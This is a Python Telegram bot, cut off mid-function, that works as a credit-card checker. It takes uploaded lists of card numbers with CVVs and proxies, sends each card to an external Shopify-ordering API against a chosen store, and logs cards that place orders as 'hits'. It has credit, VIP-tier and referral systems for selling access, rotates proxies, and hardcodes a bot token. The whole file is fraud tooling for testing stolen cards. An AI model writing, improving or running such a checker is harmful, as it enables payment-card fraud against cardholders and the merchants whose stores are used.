import os
import re
import csv
import json
import time
import math
import random
import string
import asyncio
import shutil
import aiohttp
import aiosqlite
from datetime import datetime, timedelta, timezone
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN = "8842836965:AAEJmr36WtAx10PKneZsTIil68bZ2nlL3h0"
OWNER_ID  = 8261770404

API_LIST = [
    "https://afuonax-shopii-api-production.up.railway.app/shopify",
]
STATUS_URL = "https://afuonax-shopii-api-production.up.railway.app/status"

DEFAULT_SITE = "https://msudairystore.com/"
DB_FILE      = "ultra_pro_max.db"
BACKUP_DIR   = "backups"
TIMEOUT      = 35
RETRY        = 2
COOLDOWN     = 3
MAINTENANCE  = {"on": False}
TURBO        = {"on": False}
BD_TZ        = timezone(timedelta(hours=6))

# VIP tiers: name -> (concurrency, daily_bonus)
VIP_TIERS = {
    "free":    {"concurrency": 5,  "daily": 5,   "emoji": "🥉"},
    "silver":  {"concurrency": 10, "daily": 15,  "emoji": "🥈"},
    "gold":    {"concurrency": 20, "daily": 40,  "emoji": "🥇"},
    "diamond": {"concurrency": 40, "daily": 100, "emoji": "💎"},
}
# ================================================


# ==================== DB ====================
class DB:
    def __init__(self, path): self.path = path

    async def init(self):
        os.makedirs(BACKUP_DIR, exist_ok=True)
        async with aiosqlite.connect(self.path) as db:
            await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id    INTEGER PRIMARY KEY,
                username   TEXT,
                approved   INTEGER DEFAULT 0,
                banned     INTEGER DEFAULT 0,
                credits    INTEGER DEFAULT 0,
                hits       INTEGER DEFAULT 0,
                total      INTEGER DEFAULT 0,
                vip        TEXT DEFAULT 'free',
                referrer   INTEGER DEFAULT 0,
                invites    INTEGER DEFAULT 0,
                last_daily TEXT,
                joined     TEXT,
                last_seen  TEXT
            );
            CREATE TABLE IF NOT EXISTS proxies (
                user_id INTEGER, proxy TEXT,
                ok INTEGER DEFAULT 0, fail INTEGER DEFAULT 0,
                last_used TEXT,
                PRIMARY KEY (user_id, proxy)
            );
            CREATE TABLE IF NOT EXISTS settings (
                user_id INTEGER PRIMARY KEY,
                site    TEXT,
                sites   TEXT
            );
            CREATE TABLE IF NOT EXISTS hits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, cc TEXT, gateway TEXT,
                price TEXT, response TEXT, site TEXT, ts TEXT
            );
            CREATE TABLE IF NOT EXISTS giftcodes (
                code TEXT PRIMARY KEY, credits INTEGER,
                max_uses INTEGER, uses INTEGER DEFAULT 0, created TEXT
            );
            CREATE TABLE IF NOT EXISTS jobs (
                user_id INTEGER PRIMARY KEY,
                total INTEGER, done INTEGER, hits INTEGER,
                dead INTEGER, err INTEGER, started TEXT, cancel INTEGER DEFAULT 0
            );
            """)
            await db.commit()

    async def add_user(self, uid, uname):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "INSERT OR IGNORE INTO users(user_id,username,credits,joined,last_seen) "
                "VALUES(?,?,?,?,?)",
                (uid, uname, 100, datetime.utcnow().isoformat(),
                 datetime.utcnow().isoformat())
            )
            await db.execute("UPDATE users SET last_seen=? WHERE user_id=?",
                             (datetime.utcnow().isoformat(), uid))
            await db.commit()

    async def get_user(self, uid):
        async with aiosqlite.connect(self.path) as db:
            db.row_factory = aiosqlite.Row
            cur = await db.execute("SELECT * FROM users WHERE user_id=?", (uid,))
            r = await cur.fetchone()
            return dict(r) if r else None

    async def all_users(self):
        async with aiosqlite.connect(self.path) as db:
            db.row_factory = aiosqlite.Row
            cur = await db.execute("SELECT * FROM users ORDER BY hits DESC")
            return [dict(r) for r in await cur.fetchall()]

    async def set_field(self, uid, field, value):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, uid))
            await db.commit()

    async def add_credits(self, uid, n):
        async with aiosqlite.connect(self.path) as db:
            await db.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (n, uid))
            await db.commit()

    async def spend_credit(self, uid, n=1):
        async with aiosqlite.connect(self.path) as db:
            cur = await db.execute("SELECT credits FROM users WHERE user_id=?", (uid,))
            row = await cur.fetchone()
            if not row or row[0] < n: return False
            await db.execute("UPDATE users SET credits=credits-? WHERE user_id=?", (n, uid))
            await db.commit()
            return True

    async def inc_stat(self, uid, hit=False):
        async with aiosqlite.connect(self.path) as db:
            await db.execute("UPDATE users SET total=total+1 WHERE user_id=?", (uid,))
            if hit:
                await db.execute("UPDATE users SET hits=hits+1 WHERE user_id=?", (uid,))
            await db.commit()

    async def add_proxies(self, uid, proxies):
        async with aiosqlite.connect(self.path) as db:
            for p in proxies:
                await db.execute("INSERT OR IGNORE INTO proxies(user_id,proxy) VALUES(?,?)",
                                 (uid, p))
            await db.commit()

    async def get_proxies(self, uid):
        async with aiosqlite.connect(self.path) as db:
            cur = await db.execute(
                "SELECT proxy FROM proxies WHERE user_id=? "
                "ORDER BY (CAST(ok AS FLOAT)/(ok+fail+1)) DESC, fail ASC",
                (uid,)
            )
            return [r[0] for r in await cur.fetchall()]

    async def clear_proxies(self, uid):
        async with aiosqlite.connect(self.path) as db:
            await db.execute("DELETE FROM proxies WHERE user_id=?", (uid,))
            await db.commit()

    async def proxy_feedback(self, uid, proxy, ok):
        async with aiosqlite.connect(self.path) as db:
            f = "ok" if ok else "fail"
            await db.execute(
                f"UPDATE proxies SET {f}={f}+1, last_used=? WHERE user_id=? AND proxy=?",
                (datetime.utcnow().isoformat(), uid, proxy)
            )
            await db.execute(
                "DELETE FROM proxies WHERE user_id=? AND proxy=? AND fail>=5",
                (uid, proxy)
            )
            await db.commit()

    async def set_site(self, uid, site):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "INSERT INTO settings(user_id,site) VALUES(?,?) "
                "ON CONFLICT(user_id) DO UPDATE SET site=excluded.site",
                (uid, site)
            )
            await db.commit()

    async def get_site(self, uid):
        async with aiosqlite.connect(self.path) as db:
            cur = await db.execute("SELECT site FROM settings WHERE user_id=?", (uid,))
            r = await cur.fetchone()
            return r[0] if r else DEFAULT_SITE

    async def add_hit(self, uid, cc, gateway, price, response, site=""):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "INSERT INTO hits(user_id,cc,gateway,price,response,site,ts) "
                "VALUES(?,?,?,?,?,?,?)",
                (uid, cc, gateway, price, response, site,
                 datetime.utcnow().isoformat())
            )
            await db.commit()

    async def get_hits(self, uid, limit=100):
        async with aiosqlite.connect(self.path) as db:
            db.row_factory = aiosqlite.Row
            cur = await db.execute(
                "SELECT * FROM hits WHERE user_id=? ORDER BY id DESC LIMIT ?",
                (uid, limit)
            )
            return [dict(r) for r in await cur.fetchall()]

    async def gateway_stats(self, uid):
        async with aiosqlite.connect(self.path) as db:
            cur = await db.execute(
                "SELECT gateway, COUNT(*) FROM hits WHERE user_id=? GROUP BY gateway",
                (uid,)
            )
            return await cur.fetchall()

    async def delete_hit(self, uid, hid):
        async with aiosqlite.connect(self.path) as db:
            await db.execute("DELETE FROM hits WHERE user_id=? AND id=?", (uid, hid))
            await db.commit()

    # ---- JOB tracking ----
    async def job_start(self, uid, total):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "INSERT INTO jobs(user_id,total,done,hits,dead,err,started,cancel) "
                "VALUES(?,?,0,0,0,0,?,0) "
                "ON CONFLICT(user_id) DO UPDATE SET total=excluded.total, done=0, "
                "hits=0, dead=0, err=0, started=excluded.started, cancel=0",
                (uid, total, datetime.utcnow().isoformat())
            )
            await db.commit()

    async def job_update(self, uid, done, hits, dead, err):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "UPDATE jobs SET done=?, hits=?, dead=?, err=? WHERE user_id=?",
                (done, hits, dead, err, uid)
            )
            await db.commit()

    async def job_get(self, uid):
        async with aiosqlite.connect(self.path) as db:
            db.row_factory = aiosqlite.Row
            cur = await db.execute("SELECT * FROM jobs WHERE user_id=?", (uid,))
            r = await cur.fetchone()
            return dict(r) if r else None

    async def job_cancel(self, uid):
        async with aiosqlite.connect(self.path) as db:
            await db.execute("UPDATE jobs SET cancel=1 WHERE user_id=?", (uid,))
            await db.commit()

    # ---- GIFT CODES ----
    async def create_code(self, code, credits, max_uses):
        async with aiosqlite.connect(self.path) as db:
            await db.execute(
                "INSERT OR REPLACE INTO giftcodes(code,credits,max_uses,created) "
                "VALUES(?,?,?,?)",
                (code, credits, max_uses, datetime.utcnow().isoformat())
            )
            await db.commit()

    async def redeem_code(self, code):
        async with aiosqlite.connect(self.path) as db:
            db.row_factory = aiosqlite.Row
            cur = await db.execute("SELECT * FROM giftcodes WHERE code=?", (code,))
            r = await cur.fetchone()
            if not r: return None
            if r["uses"] >= r["max_uses"]: return None
            await db.execute("UPDATE giftcodes SET uses=uses+1 WHERE code=?", (code,))
            await db.commit()
            return dict(r)


db = DB(DB_FILE)
API_HEALTH = {url: True for url in API_LIST}
LAST_CMD = {}


# ==================== HELPERS ====================
def parse_cc(line):
    line = line.strip()
    if not line or "|" not in line: return None
    p = re.split(r"[|:/ ]+", line)
    if len(p) < 4: return None
    cc = re.sub(r"\D", "", p[0])
    if len(cc) < 15: return None
    mm = p[1].zfill(2)
    yy = p[2] if len(p[2]) == 4 else "20" + p[2]
    return f"{cc}|{mm}|{yy}|{p[3]}"


def categorize(d):
    r = d.get("Response", "")
    if r == "ORDER_PLACED": return "hit"
    if r == "ERROR": return "error"
    return "dead"


def bin_info(cc):
    """Simple BIN lookup."""
    bin6 = cc[:6]
    brand = "UNKNOWN"
    if cc[0] == "4": brand = "VISA"
    elif cc[0] == "5" or bin6.startswith("2"): brand = "MASTERCARD"
    elif cc[:2] in ("34","37"): brand = "AMEX"
    elif cc[:4] == "6011" or cc[:2] == "65": brand = "DISCOVER"
    return f"🎯 BIN: <code>{bin6}</code>\n🏦 Brand: <b>{brand}</b>\n📏 Length: {len(cc)}"


def premium_card(cc, d, site=""):
    """Beautiful card-style output."""
    r = d.get("Response", "?")
    st = d.get("Status", "-")
    pr = d.get("Price", "-")
    gw = d.get("Gateway", "-")
    icons = {
        "ORDER_PLACED": "✅ 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 ✅",
        "INSUFFICIENT_FUNDS": "💰 𝐋𝐎𝐖 𝐅𝐔𝐍𝐃𝐒 💰",
        "CARD_DECLINED": "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌",
        "DECLINED": "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌",
        "ERROR": "⚠️ 𝐄𝐑𝐑𝐎𝐑 ⚠️",
    }
    head = icons.get(r, "🚫 𝐃𝐄𝐀𝐃 🚫")
    box_top = "╔══════════════════════╗"
    box_bot = "╚══════════════════════╝"
    return (
        f"{box_top}\n"
        f" {head}\n"
        f"{box_top}\n"
        f" 💳 <code>{cc}</code>\n"
        f" 📊 <b>{st}</b>\n"
        f" 🧾 <code>{r}</code>\n"
        f" 🏦 <code>{gw}</code>\n"
        f" 💵 <code>{pr}</code>\n"
        + (f" 🌐 <code>{site}</code>\n" if site else "")
        + f"{box_bot}"
    )


async def check_card(session, cc, site, proxy=None):
    healthy = [u for u in API_LIST if API_HEALTH[u]] or API_LIST
    for attempt in range(RETRY + 1):
        api = healthy[attempt % len(healthy)]
        params = {"cc": cc, "site": site}
        if proxy: params["proxy"] = proxy
        try:
            async with session.get(api, params=params, timeout=TIMEOUT) as r:
                data = await r.json(content_type=None)
                if data.get("Response") == "ERROR" and attempt < RETRY: continue
                API_HEALTH[api] = True
                return data
        except Exception as e:
            API_HEALTH[api] = False
            if attempt < RETRY: continue
            return {"Response": "ERROR", "RawResponse": str(e), "Status": "Dead"}
    return {"Response": "ERROR", "RawResponse": "all_failed", "Status": "Dead"}


async def is_allowed(uid):
    if uid == OWNER_ID: return True
    if MAINTENANCE["on"]: return False
    u = await db.get_user(uid)
    if not u or u["banned"] or not u["approved"]: return False
    return True


def cooldown_ok(uid):
    now = time.time()
    if now - LAST_CMD.get(uid, 0) < COOLDOWN: return False
    LAST_CMD[uid] = now
    return True


def gen_code(length=10):
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))


def main_menu():
    kb = [
        [InlineKeyboardButton("📥 Guide", callback_data="help"),
         InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("💎 VIP", callback_data="vip"),
         InlineKeyboardButton("🏆 Top", callback_data="top")],
        [InlineKeyboardButton("🎁 Daily", callback_data="daily"),
         InlineKeyboardButton("👥 Invite", callback_data="invite")],
        [InlineKeyboardButton("🌐 Site", callback_data="mysite"),
         InlineKeyboardButton("🔌 API", callback_data="api")],
    ]
    return InlineKeyboardMarkup(kb)


# ==================== COMMANDS ====================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    # Referral check
    ref = 0
    if ctx.args:
        try: ref = int(ctx.args[0])
        except: ref = 0

    await db.add_user(u.id, u.username or u.first_name)
    rec = await db.get_user(u.id)

    if ref and ref != u.id and rec["invites"] == 0 and rec["referrer"] == 0:
        r = await db.get_user(ref)
        if r:
            await db.set_field(u.id, "referrer", ref)
            await db.set_field(ref, "invites", (r["invites"] or 0) + 1)
            await db.add_credits(ref, 20)
            await db.add_credits(u.id, 20)
            try:
                await ctx.bot.send_message(ref, f"🎉 +20 credits! New referral: {u.first_name}")
            except Exception: pass

    if MAINTENANCE["on"] and u.id != OWNER_ID:
        await update.message.reply_text("🔧 Maintenance."); return
    if u.id != OWNER_ID:
        if rec["banned"]:
            await update.message.reply_text("🚫 Banned."); return
        if not rec["approved"]:
            await update.message.reply_html(
                f"⏳ Hello <b>{u.first_name}</b>!\n"
                f"Your ID: <code>{u.id}</code>\n\n"
                f"⏰ Wait for admin approval."
            )
            try:
                await ctx.bot.send_message(
                    OWNER_ID,
                    f"🆕 New User!\n"
                    f"👤 <b>{u.first_name}</b>\n"
                    f"🆔 <code>{u.id}</code>\n"
                    f"🔗 @{u.username}\n\n"
                    f"<code>/approve {u.id}</code>",
                    parse_mode=ParseMode.HTML
                )
            except Exception: pass
            return

    vip = VIP_TIERS.get(rec["vip"], VIP_TIERS["free"])
    await update.message.reply_html(
        f"╔══════════════════════╗\n"
        f"    🌌 <b>ULTRA PRO MAX</b>\n"
        f"      <b>CC CHECKER</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{vip['emoji']} VIP: <b>{rec['vip'].upper()}</b>\n"
        f"💰 Credits: <b>{rec['credits']}</b>\n"
        f"✅ Hits: <b>{rec['hits']}</b>\n"
        f"🔢 Total: <b>{rec['total']}</b>\n"
        f"👥 Invites: <b>{rec['invites']}</b>\n\n"
        f"📌 /addproxy /chk /sh /dashboard /daily /invite",
        reply_markup=main_menu()
    )


async def cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    u = await db.get_user(uid)
    if not u: return
    vip = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])

    if q.data == "help":
        await q.message.reply_html(
            "📥 <b>Complete Guide</b>\n\n"
            "1️⃣ Upload proxy .txt → reply <code>/addproxy</code>\n"
            "2️⃣ Upload CC .txt → reply <code>/chk</code>\n"
            "3️⃣ Single: <code>/sh cc|mm|yy|cvv</code>\n"
            "4️⃣ <code>/setsite https://site.com/</code>\n"
            "5️⃣ <code>/dashboard</code> — full panel\n"
            "6️⃣ <code>/daily</code> — daily bonus\n"
            "7️⃣ <code>/invite</code> — earn credits\n"
            "8️⃣ <code>/bin 401795</code> — bin lookup\n"
            "9️⃣ <code>/jobs</code> — running jobs\n"
            "🔟 <code>/export</code> — download hits"
        )
    elif q.data == "stats":
        rate = (u["hits"]/u["total"]*100) if u["total"] else 0
        await q.message.reply_html(
            f"📊 <b>Your Stats</b>\n\n"
            f"👤 <code>{uid}</code>\n"
            f"{vip['emoji']} VIP: <b>{u['vip'].upper()}</b>\n"
            f"💰 Credits: <b>{u['credits']}</b>\n"
            f"✅ Hits: <b>{u['hits']}</b>\n"
            f"🔢 Total: <b>{u['total']}</b>\n"
            f"📈 Rate: <b>{rate:.2f}%</b>\n"
            f"👥 Invites: <b>{u['invites']}</b>"
        )
    elif q.data == "top":
        users = await db.all_users()
        txt = "🏆 <b>Leaderboard</b>\n\n"
        for i, ur in enumerate(users[:10], 1):
            em = VIP_TIERS.get(ur["vip"], VIP_TIERS["free"])["emoji"]
            txt += f"{i}. {em} <code>{ur['user_id']}</code> — <b>{ur['hits']}</b> hits\n"
        await q.message.reply_html(txt)
    elif q.data == "vip":
        txt = "💎 <b>VIP Tiers</b>\n\n"
        for name, info in VIP_TIERS.items():
            txt += f"{info['emoji']} <b>{name.upper()}</b>\n"
            txt += f"   ⚡ Concurrency: {info['concurrency']}\n"
            txt += f"   🎁 Daily: {info['daily']} credits\n\n"
        txt += "👑 Contact admin for upgrade."
        await q.message.reply_html(txt)
    elif q.data == "daily":
        today = datetime.now(BD_TZ).strftime("%Y-%m-%d")
        if u["last_daily"] == today:
            await q.message.reply_text("🎁 Already claimed today."); return
        await db.add_credits(uid, vip["daily"])
        await db.set_field(uid, "last_daily", today)
        await q.message.reply_html(f"🎁 +<b>{vip['daily']}</b> credits claimed!")
    elif q.data == "invite":
        bot = ctx.bot
        me = await bot.get_me()
        link = f"https://t.me/{me.username}?start={uid}"
        await q.message.reply_html(
            f"👥 <b>Invite & Earn</b>\n\n"
            f"🔗 Your link:\n<code>{link}</code>\n\n"
            f"💰 +20 credits per invite (and they get +20 too!)"
        )
    elif q.data == "mysite":
        await q.message.reply_text(await db.get_site(uid))
    elif q.data == "api":
        txt = "🔌 <b>API Health</b>\n\n"
        for u in API_LIST:
            txt += f"{'🟢' if API_HEALTH[u] else '🔴'} <code>{u}</code>\n"
        await q.message.reply_html(txt)


async def dashboard_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = await db.get_user(uid)
    if not u: return
    vip = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])
    hits = await db.get_hits(uid, 3)
    rate = (u["hits"]/u["total"]*100) if u["total"] else 0
    txt = (
        "╔══════════════════════╗\n"
        "    📊 <b>DASHBOARD</b>\n"
        "╚══════════════════════╝\n\n"
        f"👤 <code>{uid}</code> @{u['username']}\n"
        f"{vip['emoji']} VIP: <b>{u['vip'].upper()}</b>\n"
        f"⚡ Concurrency: <b>{vip['concurrency']}</b>\n"
        f"💰 Credits: <b>{u['credits']}</b>\n"
        f"✅ Hits: <b>{u['hits']}</b>\n"
        f"🔢 Total: <b>{u['total']}</b>\n"
        f"📈 Rate: <b>{rate:.2f}%</b>\n"
        f"👥 Invites: <b>{u['invites']}</b>\n"
        f"📅 Joined: <code>{u['joined'][:10]}</code>\n"
        f"🕒 Last: <code>{u['last_seen'][:16] if u['last_seen'] else '-'}</code>\n"
    )
    if hits:
        txt += "\n🔥 <b>Recent Hits:</b>\n"
        for h in hits:
            txt += f"• <code>{h['cc']}</code>\n"
    await update.message.reply_html(txt)


async def daily_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = await db.get_user(uid)
    vip = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])
    today = datetime.now(BD_TZ).strftime("%Y-%m-%d")
    if u["last_daily"] == today:
        await update.message.reply_text("🎁 Already claimed."); return
    await db.add_credits(uid, vip["daily"])
    await db.set_field(uid, "last_daily", today)
    await update.message.reply_html(f"🎁 +<b>{vip['daily']}</b> credits!")


async def invite_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    me = await ctx.bot.get_me()
    link = f"https://t.me/{me.username}?start={update.effective_user.id}"
    await update.message.reply_html(
        f"👥 <b>Invite & Earn</b>\n\n🔗 <code>{link}</code>\n\n"
        f"💰 +20 credits per successful invite!"
    )


async def bin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /bin 401795"); return
    num = re.sub(r"\D", "", ctx.args[0])
    if len(num) < 6:
        await update.message.reply_text("❌ Need at least 6 digits."); return
    await update.message.reply_html(bin_info(num))


async def jobs_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    j = await db.job_get(uid)
    if not j:
        await update.message.reply_text("No jobs."); return
    await update.message.reply_html(
        f"🎯 <b>Job Status</b>\n\n"
        f"💳 Total: <b>{j['total']}</b>\n"
        f"✔️ Done: <b>{j['done']}</b>\n"
        f"✅ Hits: <b>{j['hits']}</b>\n"
        f"❌ Dead: <b>{j['dead']}</b>\n"
        f"⚠️ Err: <b>{j['err']}</b>\n"
        f"🚫 Cancel: <b>{'YES' if j['cancel'] else 'NO'}</b>"
    )


async def cancel_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await db.job_cancel(update.effective_user.id)
    await update.message.reply_text("🚫 Cancel requested.")


async def pay_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) < 2:
        await update.message.reply_text("Usage: /pay <uid> <amount>"); return
    uid = update.effective_user.id
    try:
        target, amt = int(ctx.args[0]), int(ctx.args[1])
    except:
        await update.message.reply_text("❌ Invalid."); return
    if amt <= 0 or target == uid:
        await update.message.reply_text("❌ Invalid."); return
    u = await db.get_user(uid)
    if u["credits"] < amt:
        await update.message.reply_text("❌ Not enough credits."); return
    await db.add_credits(uid, -amt)
    await db.add_credits(target, amt)
    await update.message.reply_text(f"✅ Sent {amt} credits to {target}")
    try:
        await ctx.bot.send_message(target, f"💰 +{amt} credits from {uid}")
    except Exception: pass


# ---------- Admin ----------
async def approve_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not ctx.args: return
    uid = int(ctx.args[0])
    await db.set_field(uid, "approved", 1)
    await update.message.reply_text(f"✅ Approved {uid}")
    try: await ctx.bot.send_message(uid, "✅ Approved! /start")
    except Exception: pass


async def addcredits_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(ctx.args) < 2: return
    uid, n = int(ctx.args[0]), int(ctx.args[1])
    await db.add_credits(uid, n)
    await update.message.reply_text(f"💰 +{n} → {uid}")
    try: await ctx.bot.send_message(uid, f"💰 +{n} credits!")
    except Exception: pass


async def setvip_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(ctx.args) < 2: return
    uid, tier = int(ctx.args[0]), ctx.args[1].lower()
    if tier not in VIP_TIERS:
        await update.message.reply_text(f"❌ Tiers: {list(VIP_TIERS.keys())}"); return
    await db.set_field(uid, "vip", tier)
    await update.message.reply_text(f"💎 {uid} → {tier}")
    try: await ctx.bot.send_message(uid, f"💎 VIP upgraded to {tier.upper()}!")
    except Exception: pass


async def ban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not ctx.args: return
    await db.set_field(int(ctx.args[0]), "banned", 1)
    await update.message.reply_text("🚫 Banned")


async def unban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not ctx.args: return
    await db.set_field(int(ctx.args[0]), "banned", 0)
    await update.message.reply_text("✅ Unbanned")


async def users_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    users = await db.all_users()
    txt = f"👥 Total: <b>{len(users)}</b>\n\n"
    for u in users[:40]:
        m = "👑" if u["user_id"]==OWNER_ID else ("🚫" if u["banned"] else ("✅" if u["approved"] else "⏳"))
        txt += f"{m} <code>{u['user_id']}</code> @{u['username']} {u['vip']} c:{u['credits']}\n"
    await update.message.reply_html(txt)


async def broadcast_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    if not ctx.args:
        await update.message.reply_text("Usage: /broadcast <msg>"); return
    msg = " ".join(ctx.args)
    users = await db.all_users()
    sent = 0
    for u in users:
        try:
            await ctx.bot.send_message(u["user_id"], f"📢 <b>Broadcast</b>\n\n{msg}",
                                       parse_mode=ParseMode.HTML)
            sent += 1
        except Exception: pass
    await update.message.reply_text(f"📢 Sent to {sent}")


async def maintenance_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not ctx.args: return
    MAINTENANCE["on"] = ctx.args[0].lower() in ("on","1","true")
    await update.message.reply_text(f"🔧 Maintenance: {'ON' if MAINTENANCE['on'] else 'OFF'}")


async def turbo_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    TURBO["on"] = not TURBO["on"]
    await update.message.reply_text(f"⚡ Turbo: {'ON' if TURBO['on'] else 'OFF'}")


async def gen_code_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    if len(ctx.args) < 2:
        await update.message.reply_text("Usage: /gencode <credits> <max_uses>"); return
    credits, uses = int(ctx.args[0]), int(ctx.args[1])
    code = gen_code(10)
    await db.create_code(code, credits, uses)
    await update.message.reply_html(
        f"🎁 <b>Gift Code Created</b>\n\n"
        f"Code: <code>{code}</code>\n"
        f"Credits: <b>{credits}</b>\n"
        f"Max Uses: <b>{uses}</b>"
    )


async def redeem_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: /redeem CODE"); return
    code = ctx.args[0].upper()
    c = await db.redeem_code(code)
    if not c:
        await update.message.reply_text("❌ Invalid or expired."); return
    await db.add_credits(update.effective_user.id, c["credits"])
    await update.message.reply_html(f"🎉 +<b>{c['credits']}</b> credits!")


# ---------- Proxy / Site ----------
async def addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_allowed(uid): return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("❗ Reply to .txt with /addproxy"); return
    doc: Document = msg.reply_to_message.document
    f = await doc.get_file()
    content = (await f.download_as_bytearray()).decode("utf-8", errors="ignore")
    ps = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    if not ps:
        await msg.reply_text("❌ Empty."); return
    await db.add_proxies(uid, ps)
    await msg.reply_text(f"✅ Added {len(ps)} proxies.")


async def myproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ps = await db.get_proxies(update.effective_user.id)
    if not ps:
        await update.message.reply_text("No proxies."); return
    await update.message.reply_html(
        f"🔌 <b>Proxies ({len(ps)})</b>\n" + "\n".join(f"<code>{p}</code>" for p in ps[:40])
    )


async def clearproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await db.clear_proxies(update.effective_user.id)
    await update.message.reply_text("🧹 Cleared")


async def setsite(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await is_allowed(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text("Usage: /setsite url"); return
    site = ctx.args[0].strip()
    if not site.startswith("http"): site = "https://" + site
    if not site.endswith("/"): site += "/"
    await db.set_site(update.effective_user.id, site)
    await update.message.reply_text(f"✅ {site}")


# ---------- Checker ----------
async def sh(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_allowed(uid): return
    if not cooldown_ok(uid):
        await update.message.reply_text("⏱️ Cooldown."); return
    if not ctx.args:
        await update.message.reply_text("Usage: /sh cc|mm|yy|cvv"); return
    cc = parse_cc(" ".join(ctx.args))
    if not cc:
        await update.message.reply_text("❌ Invalid."); return
    if not await db.spend_credit(uid, 1):
        await update.message.reply_text("❌ No credits."); return
    site = await db.get_site(uid)
    ps = await db.get_proxies(uid)
    proxy = ps[0] if ps else None
    wait = await update.message.reply_text("⏳ Checking...")
    async with aiohttp.ClientSession() as s:
        data = await check_card(s, cc, site, proxy)
    cat = categorize(data)
    if proxy: await db.proxy_feedback(uid, proxy, cat in ("hit","dead"))
    await db.inc_stat(uid, hit=(cat=="hit"))
    if cat == "hit":
        await db.add_hit(uid, cc, data.get("Gateway","-"),
                         data.get("Price","-"), data.get("Response",""), site)
    await wait.edit_text(premium_card(cc, data, site), parse_mode=ParseMode.HTML)


async def chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_allowed(uid): return
    if not cooldown_ok(uid):
        await update.message.reply_text("⏱️ Cooldown."); return
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("❗ Reply to .txt with /chk"); return

    site = await db.get_site(uid)
    proxies = await db.get_proxies(uid)

    doc: Document = msg.reply_to_message.document
    f = await doc.get_file()
    content = (await f.download_as_bytearray()).decode("utf-8", errors="ignore")

    # Optional filter: /chk 401795 (only matching BIN)
    filt = ctx.args[0].strip() if ctx.args else None

    seen, cards = set(), []
    for line in content.splitlines():
        c = parse_cc(line)
        if not c: continue
        if filt and not c.startswith(filt): continue
        if c in seen: continue
        seen.add(c); cards.append(c)

    if not cards:
        await msg.reply_text("❌ No valid CCs."); return

    u = await db.get_user(uid)
    if uid != OWNER_ID and u["credits"] < len(cards):
        await msg.reply_text(f"❌ Need {len(cards)} credits, have {u['credits']}."); return

    vip = VIP_TIERS.get(u["vip"], VIP_TIERS["free"])
    conc = vip["concurrency"]
    if TURBO["on"]: conc *= 3

    await db.job_start(uid, len(cards))

    status_msg = await msg.reply_text(
        f"🚀 <b>Starting...</b>\n"
        f"💳 {len(cards)} | 🔌 {len(proxies)} | ⚡ ×{conc}"
        + (f"\n🎯 Filter: {filt}" if filt else ""),
